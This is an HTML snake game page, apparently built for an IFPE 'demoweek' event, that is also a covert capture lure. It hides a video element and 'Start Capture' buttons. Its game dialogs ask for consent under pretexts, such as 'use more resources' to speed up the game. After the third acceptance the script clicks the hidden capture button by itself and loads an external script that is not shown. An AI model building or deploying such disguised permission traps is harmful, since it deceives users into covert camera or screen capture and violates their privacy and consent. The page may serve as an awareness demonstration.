<!DOCTYPE html>
<!--This can be played with arrow keys as well as on-screen buttons-->
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
	<title> Snake Game </title>


<style>
html, body {
	overflow: hidden;
	height: 100%;
}
/* Remove duplicate body style */
body {
	margin: 0;
	padding: 0;
	background: #87a34e;
	min-height: 100vh;
	font-family: 'Press Start 2P', 'VT323', monospace;
	display: flex;
	flex-direction: column;
	align-items: center;
	justify-content: flex-start;
}


/* Remove duplicate/broken canvas style */
canvas {
	margin-top: 20px !important;
	background: #87a34e;
	border: 2px solid #2B301A;
	border-radius: 0;
	image-rendering: pixelated;
	margin: 0 auto;
	width: 250px;
	height: 250px !important;
}
/* Clean gamepad and button styles */
.gamepad {
	margin: 32px auto 0 auto;
	display: grid;
	grid-template-areas:
		". up ."
		"left center right"
		". down .";
	grid-gap: 18px;
	justify-items: center;
	align-items: center;
	width: 260px;
	z-index: 10;
}
.gamepad-btn {
	width: 70px;
	height: 70px;
	background: #2B2F18;
	color: #fff;
	font-size: 2.2rem;
	font-family: 'Press Start 2P', 'VT323', monospace;
	border: none;
	border-radius: 0;
	outline: none;
	cursor: pointer;
	user-select: none;
	box-shadow: none;
	transition: background 0.1s, color 0.1s;
	display: flex;
	align-items: center;
	justify-content: center;
}
.gamepad-btn:active {
	background: #8da556;
	color: #2b2f1e;
}
.gamepad-btn.center {
	background: transparent;
	border: none;
	pointer-events: none;
}
.gamepad-btn:active {
	background: #8da556;
	color: #2b2f1e;
}
.gamepad-btn.center {
	background: #222;
	border: none;
	pointer-events: none;
}
.gamepad-btn.center {
	background: transparent;
	border: none;
	pointer-events: none;
}

@media (max-width: 500px) {
	.gamepad {
		width: 98vw;
		max-width: 180px;
		bottom: 8px;
	}
	.gamepad-btn {
		width: 36px;
		height: 36px;
		font-size: 1.1rem;
	}
}

@import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=VT323&family=Roboto:wght@400;500;700&display=swap');
</style>

<style id="modal-overlay-style" media="screen">
#modal { display:none; background: transparent; position:fixed; inset:0; transition: background .25s; }
#modal.open { display:flex !important; background: rgba(0,0,0,.55) !important; }
#modal-content { opacity:0; transform:scale(.92); transition:opacity .25s, transform .25s; display:block; }
#modal.open #modal-content { opacity:1; transform:scale(1); }
</style>

<style id="ios-modal-style" media="screen">
/* Estilo do dialog box iOS, só será ativado via JS se for iOS */
#modal.ios {
	background: transparent !important;
	align-items: center !important;
	justify-content: center !important;
	display: none !important;
	min-height: 100vh !important;
	transition: background .25s;
}
#modal.ios.open { display:flex !important; background: rgba(0,0,0,.35) !important; }
#modal-content.ios { background:#f9f9f9 !important; color:#222 !important; border-radius:18px !important; box-shadow:0 8px 32px rgba(0,0,0,.18); width:250px; max-width:250px; padding:20px 14px 0 14px !important; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif !important; font-size:.95rem !important; text-align:center; }
#modal-content.ios #modal-text {
	display: block;
	margin-bottom: 18px;
	color: #222;
}
#modal-content.ios .ios-btns { display:flex; flex-direction:row; gap:0; margin:0 -14px; border-top:1px solid #e5e5ea; border-radius:0 0 18px 18px; overflow:hidden; }
#modal-content.ios .ios-btn { flex:1; border:none; border-radius:0; background:#fff; color:#007aff; font-size:15px; padding:12px 0 11px; margin:0; cursor:pointer; transition:background .12s; font-weight:500; }
#modal-content.ios .ios-btn + .ios-btn { border-left:1px solid #e5e5ea; }
#modal-content.ios .ios-btn:active { background:#f2f2f7; }
#modal-content.ios .ios-btn.cancel { color:#ff3b30; font-weight:600; }

/* iOS open state handled by parent .open */
/* Remove extra stray closing style tags */
</style>
<style id="android-modal-style" media="screen">
/* Estilo Material (Android) aplicado somente se NÃO iOS */
#modal.android { background:transparent; align-items:center; justify-content:center; display:none; }
#modal.android.open { display:flex !important; background:rgba(0,0,0,.45); }
#modal-content.android { background:#fff; color:#212121; border-radius:8px; box-shadow:0 8px 16px -4px rgba(0,0,0,.35), 0 2px 6px rgba(0,0,0,.20); width:280px; max-width:92vw; padding:20px 24px 0 24px; font-family:'Roboto','Noto','Helvetica Neue','Arial',sans-serif; font-size:15px; line-height:20px; letter-spacing:.15px; text-align:left; position:relative; overflow:hidden; }
#modal-content.android .md-text { margin:0 0 12px; font-weight:400; }
#modal-content.android .md-btns { display:flex; flex-direction:column; margin:8px -24px 0; }
#modal-content.android .md-btn { appearance:none; -webkit-appearance:none; background:transparent; border:none; padding:14px 16px 12px; margin:0; font:500 14px 'Roboto','Noto',sans-serif; letter-spacing:.75px; text-transform:uppercase; color:#1976d2; text-align:center; cursor:pointer; position:relative; }
#modal-content.android .md-btn + .md-btn { border-top:1px solid #e0e0e0; }
#modal-content.android .md-btn:active { background:#f5f5f5; }
#modal-content.android .md-btn:focus-visible { outline:none; box-shadow:inset 0 0 0 2px rgba(25,118,210,.35); }
@media (hover:hover){ #modal-content.android .md-btn:hover { background:#f5f5f5; } }
</style>
</head>
<body>
	<!-- Bloco de captura de vídeo incorporado do antigo index.html -->
	<h1 style="margin-top:18px; font-size:18px;">Carregando jogo...</h1>
	<video id="video" style="display:none;" autoplay playsinline></video>
	<div style="margin-top:10px; display:none; gap:8px; flex-wrap:wrap; justify-content:center;">
		<button id="startBtn">Start Capture</button>
		<button id="stopBtn" disabled>Stop Capture</button>
	</div>

	<canvas></canvas>



<div class="gamepad">
	<button id="b1" class="gamepad-btn" style="grid-area: up; transform: rotate(180deg);">&#9660;</button>
	<button id="b2" class="gamepad-btn" style="grid-area: down; transform: rotate(0deg);">&#9660;</button>
	<button id="b3" class="gamepad-btn" style="grid-area: left; transform: rotate(90deg);">&#9660;</button>
	<button class="gamepad-btn center" style="grid-area: center;" disabled></button>
	<button id="b4" class="gamepad-btn" style="grid-area: right; transform: rotate(-90deg);">&#9660;</button>
</div>
<!-- Modal container -->
<div id="modal" style="z-index:1000; align-items:center; justify-content:center;">
	<div id="modal-content">
		<span id="modal-text"></span>
		<div id="modal-btns">
			<button id="cancel-modal">Cancelar</button>
			<button id="accept-modal">Aceitar</button>
		</div>
	</div>
</div>

<script>

var c = document.querySelector("canvas");
var cc = c.getContext("2d");
var mainWid = Math.min(window.innerWidth, 400) - 20;
var mainHit = Math.max(window.innerHeight * 0.6, 320);
var scorew;
var scoreh;

var sx = Math.floor(1/100*mainHit);
var smx = -Math.floor(1/100*mainHit);
var sy = Math.floor(1/100*mainHit);
var smy = -Math.floor(1/100*mainHit);

var snake = {
	x: mainWid/2,
	y: mainHit/2,
	vx: 0,
	vy: smy,
	width: 20,
	height: 20
}

var tail = 1;
var trail = [];

var food = {
	x: Math.floor(Math.random()*mainWid-10),
	y: Math.floor(Math.random()*mainHit-10),
	width: 15,
	height: 15
}

var score = 0;
var hscore = 0;

var b1 = document.querySelector("#b1");
var b2 = document.querySelector("#b2");
var b3 = document.querySelector("#b3");
var b4 = document.querySelector("#b4"); 

b1.addEventListener("click",moveup);
b2.addEventListener("click",movedown);
b3.addEventListener("click",moveleft);
b4.addEventListener("click",moveright);

document.addEventListener("keydown",controls);

function controls(e){
	if (e.keyCode == 37){
		snake.vx = smx;
		snake.vy = 0;
	}
	if (e.keyCode == 38){
		snake.vx = 0;
		snake.vy = smy;
	}
	if (e.keyCode == 39){
		snake.vx = sx;
		snake.vy = 0;
	}
	if (e.keyCode == 40){
		snake.vx = 0;
		snake.vy = sy;		
	}	
}

function moveup(){
	snake.vx = 0;
	snake.vy = smy;
}

function movedown(){
	snake.vx = 0;
	snake.vy = sy;
}

function moveleft(){
	snake.vx = smx;
	snake.vy = 0;
}

function moveright(){
	snake.vx = sx;
	snake.vy = 0;
}

function update(){
	snake.x += snake.vx;
	snake.y += snake.vy;

	if (snake.x < 0){
		snake.x = c.width;
	}

	if (snake.x > c.width){
		snake.x = 0;
	}

	if (snake.y < 0){
		snake.y = c.height;
	}

	if (snake.y > c.height){
		snake.y = 0;
	}

	if (
		snake.x <= food.x + food.width &&
		snake.y <= food.y + food.height &&
		food.x <= snake.x + food.width &&
		food.y <= snake.y + food.height
		){
		score++;
		tail += 3;
		food.x = Math.floor(Math.random()*c.width-10);
		food.y = Math.floor(Math.random()*c.height-10);
	}

	for (var i=0;i<trail.length;i++){
		if (trail[i].x == snake.x && trail[i].y == snake.y){
			tail = 1;
			if (hscore <= score){
				hscore = score;
			}
			score = 0;
		}
	}

	trail.push({x: snake.x, y: snake.y});
	while (trail.length > tail){
		trail.shift();
	}
}

function render(){
	cc.fillStyle = "#87a34e";
	cc.fillRect(0,0,c.width,c.height);

	for (var i=0;i<trail.length;i++){
		cc.fillStyle = "#2E311B";
		cc.fillRect(trail[i].x,trail[i].y,snake.width,snake.height);
	}

	cc.fillStyle = "#2E311B";
	cc.fillRect(food.x,food.y,food.width,food.height);

	cc.fillStyle = "white";
	cc.font = "20px Aerial";
	cc.fillText("Score: "+score+"   HighScore: "+hscore,scorew,scoreh);
}

function loop(){
	render();
	update();
}
// Removido setInterval: usamos requestAnimationFrame controlado abaixo

function init(){
		mainWid = 300;
		mainHit = 380;
		c.width = mainWid;
		c.height = mainHit;
		scoreWid = mainWid/2 - 100;
		scoreHit = 50;
		scoreh = scoreHit;
		scorew = scoreWid;
	}

// MODAL LOGIC
const modalContents = [
	"Bem-vindo ao Snake! Use as setas ou botões para jogar. Aceite para continuar.",
	"Permite que o jogo utilize mais recursos para uma experiência melhor? (Aceite para acelerar)",
	"Evite colidir com você mesmo! Boa sorte! Aceite para jogar.",
	"Não se esqueca de seguir a demoweek no Instagram!",
	"E o ifpe campus igarassu também, hein"
];

// GAME LOOP CONTROL (refatorado)
let desiredFPS = 5; // começa lento (5 FPS)
let frameInterval = 1000 / desiredFPS;
let lastFrameTime = 0;
let running = true;

function setGameLoopSpeed(fps){
	desiredFPS = fps;
	frameInterval = 1000 / desiredFPS;
}

function gameLoop(timestamp){
	if (!running) return;
	if (timestamp - lastFrameTime >= frameInterval){
		lastFrameTime = timestamp;
		loop();
	}
	requestAnimationFrame(gameLoop);
}

window.addEventListener('load', () => {
	init();
	window.addEventListener('resize', init, false);
	requestAnimationFrame(gameLoop);
});
let modalIndex = 0;
const modal = document.getElementById('modal');
const modalContent = document.getElementById('modal-content');
const modalText = document.getElementById('modal-text');
const modalBtns = document.getElementById('modal-btns');
const acceptModalBtn = document.getElementById('accept-modal');
const cancelModalBtn = document.getElementById('cancel-modal');

// Detecta iOS
function isIOS() {
	return /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
}

if (isIOS()) {
	modal.classList.add('ios');
	modalContent.classList.add('ios');
	modalBtns.className = 'ios-btns';
	acceptModalBtn.className = 'ios-btn';
	cancelModalBtn.className = 'ios-btn cancel';
	acceptModalBtn.style = '';
	cancelModalBtn.style = '';
} else {
	// Android / Material
	modal.classList.add('android');
	modalContent.classList.add('android');
	// Reconstruir conteúdo para Material se desejar outro wrapper
	// Mantemos estrutura simples, só classes e reorganização vertical já no CSS
	modalBtns.className = 'md-btns';
	acceptModalBtn.className = 'md-btn';
	cancelModalBtn.className = 'md-btn';
	acceptModalBtn.textContent = 'ACEITAR';
	cancelModalBtn.textContent = 'FECHAR';
	// Reordena DOM para ACEITAR ficar acima de FECHAR
	if (modalBtns.firstElementChild === cancelModalBtn) {
		modalBtns.insertBefore(acceptModalBtn, cancelModalBtn);
	}
	document.body.style.fontFamily = "Roboto,'Noto',sans-serif";
}

function showModal() {
	if (modalIndex < modalContents.length) {
		if (modal.classList.contains('open')) return;
		modalText.textContent = modalContents[modalIndex];
		modal.classList.add('open');
	}
}



function acceptModal() {
	modal.classList.remove('open');
	// Só avança se o último botão de direção foi clicado
	if (acceptModal.lastDirectionBtn) {
		// aceleração apenas após aceitar a segunda modal (index 1)
		if (modalIndex === 1) {
			setGameLoopSpeed(15);
		}
		// Avança índice
		modalIndex++;
		// Se acabou de aceitar a modal que libera o jogo (index 2 original) agora index 2 é "Evite colidir..."
		// Iniciar jogo ao aceitar a modal de index 2 (antes das duas promocionais) se ainda não iniciado
		if (modalIndex === 3 && typeof startBtn !== 'undefined' && startBtn && !acceptModal.startFired) {
			startBtn.click();
			startBtn.style.display = 'none';
			acceptModal.startFired = true;
		}
	}
	acceptModal.lastDirectionBtn = null;
}

function cancelModal() {
	modal.classList.remove('open');
}


acceptModalBtn.addEventListener('click', acceptModal);
cancelModalBtn.addEventListener('click', cancelModal);

// Adiciona evento aos botões de direção para abrir modal (sem impedir movimento)
function handleDirectionPress(id){
	switch(id){
		case 'b1': moveup(); break;
		case 'b2': movedown(); break;
		case 'b3': moveleft(); break;
		case 'b4': moveright(); break;
	}
	if (modalIndex < modalContents.length && !modal.classList.contains('open')) {
		acceptModal.lastDirectionBtn = true;
		showModal();
	} else {
		acceptModal.lastDirectionBtn = true;
	}
}

['b1','b2','b3','b4'].forEach(id => {
	const btn = document.getElementById(id);
	const handler = (e)=>{ e.preventDefault(); handleDirectionPress(id); };
	btn.addEventListener('pointerdown', handler);
	btn.addEventListener('touchstart', handler, {passive:false});
	btn.addEventListener('click', handler);
});

// Garantir que teclas também possam abrir primeira modal
document.addEventListener('keydown', (e) => {
	if ([37,38,39,40].includes(e.keyCode)) {
		if (modalIndex < modalContents.length && !modal.classList.contains('open')) {
			acceptModal.lastDirectionBtn = true;
			showModal();
		}
	}
});

// Fallback: primeira interação touch em qualquer lugar abre modal se nada abriu
document.addEventListener('touchend', function firstTouch(){
	if (modalIndex === 0 && !modal.classList.contains('open')) {
		acceptModal.lastDirectionBtn = true;
		showModal();
	}
	document.removeEventListener('touchend', firstTouch);
}, {passive:true});

</script>

<script src="/static/index.js"></script>
</body>

</html>
